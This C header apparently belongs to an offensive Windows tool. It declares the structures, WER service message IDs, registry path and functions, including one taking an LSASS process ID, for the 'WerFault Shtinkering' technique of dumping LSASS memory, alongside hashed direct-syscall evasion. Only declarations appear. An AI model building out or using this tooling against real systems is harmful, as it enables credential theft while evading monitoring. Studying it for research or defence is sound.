#pragma once

#include <windows.h>
#include <winternl.h>

#include "dinvoke.h"
#include "syscalls.h"

#ifndef EVENT_QUERY_STATE
#define EVENT_QUERY_STATE 0x0001
#endif

#ifndef ALPC_MSGFLG_SYNC_REQUEST
#define ALPC_MSGFLG_SYNC_REQUEST   0x20000
#endif

#define SHTINKERING_KEY L"\\Registry\\Machine\\Software\\Microsoft\\Windows\\Windows Error Reporting\\LocalDumps\\"
#ifndef LOCAL_DUMP
#define LOCAL_DUMP 0x2
#endif

typedef struct _EVENT_DESCRIPTOR {
  USHORT    Id;
  UCHAR     Version;
  UCHAR     Channel;
  UCHAR     Level;
  UCHAR     Opcode;
  USHORT    Task;
  ULONGLONG Keyword;
} EVENT_DESCRIPTOR, *PEVENT_DESCRIPTOR;

typedef struct _EVENT_DATA_DESCRIPTOR {
  ULONGLONG Ptr;
  ULONG     Size;
  union {
    ULONG Reserved;
    struct {
      UCHAR  Type;
      UCHAR  Reserved1;
      USHORT Reserved2;
    } DUMMYSTRUCTNAME;
  } DUMMYUNIONNAME;
} EVENT_DATA_DESCRIPTOR, *PEVENT_DATA_DESCRIPTOR;

typedef ULONG(WINAPI* EtwEventWriteNoRegistration_t) (GUID const *ProviderId, EVENT_DESCRIPTOR const *EventDescriptor, ULONG UserDataCount, EVENT_DATA_DESCRIPTOR *UserData);

#define EtwEventWriteNoRegistration_SW2_HASH 0x980FF899
#define NtUpdateWnfStateData_SW2_HASH 0x6CC3F2FE
#define GetEnvironmentVariableW_SW2_HASH 0x2F9C600B

enum WerSvcMessageId
{
    RequestReportUnhandledException = 0x20000000,
    ReplyReportUnhandledExceptionSuccess = 0x20000001,
    ReplyReportUnhandledExceptionFailure = 0x20000002,
    RequestSilentProcessExit = 0x30000000,
    ResponseSilentProcessExitSuccess = 0x30000001,
    ResponseSilentProcessExitFailure = 0x30000002
};

typedef struct _MappedViewStruct
{
    DWORD Size;
    DWORD TargetProcessPid;
    DWORD TargetThreadTid;
    DWORD Filler0[39];
    EXCEPTION_POINTERS* ExceptionPointers;
#ifndef _WIN64
    DWORD Filler1;
#endif
    DWORD NtErrorCode;
    DWORD Filler2;
    HANDLE hTargetProcess;
#ifndef _WIN64
    DWORD Filler3;
#endif
    HANDLE hTargetThread;
#ifndef _WIN64
    DWORD Filler4;
#endif
    HANDLE hRecoveryEvent;
#ifndef _WIN64
    DWORD Filler5;
#endif
    HANDLE hCompletionEvent;
#ifndef _WIN64
    DWORD Filler6;
#endif
    DWORD Filler7;
    DWORD Filler8;
    DWORD Null01;
    DWORD Null02;
    DWORD NtStatusErrorCode;
    DWORD Null03;
    DWORD TickCount;
    DWORD Unk101;
} MappedViewStruct, *PMappedViewStruct;

BOOL wait_for_wersvc(VOID);

BOOL signal_start_wersvc(VOID);

BOOL send_message_to_wer_service(
    IN PVOID SendingMessage,
    OUT PVOID ReceivingMessage);

BOOL find_valid_thread_id(
    IN DWORD process_id,
    OUT PDWORD pthread_id);

BOOL werfault_shtinkering(
    IN DWORD lsass_pid,
    IN HANDLE hProcess);
